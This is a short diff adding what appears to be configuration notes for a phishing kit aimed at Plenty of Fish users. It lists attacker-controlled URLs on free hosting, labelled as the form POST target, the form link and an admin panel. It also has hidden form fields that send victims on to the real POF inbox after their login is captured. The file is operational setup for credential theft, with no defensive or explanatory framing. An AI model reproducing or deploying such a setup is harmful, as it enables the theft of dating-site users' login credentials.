@@ -1,0 +1,25 @@
+
+zimSAIDi
+
+http://ormit.co.nf/index.php
+
+
+<input type="hidden" name="onext" value="https://www.pof.com/inbox.aspx">
+					<input type="hidden" name="klynt" value="pofTAY">
+
+
+POST URL
+http://xumit.co.nf/index.php
+
+
+
+
+FORM LINK
+http://zimbax.getforge.io/
+
+
+
+ADMIN URL
+http://ormix.co.nf/manage/?klynt=zimKELi
+
+
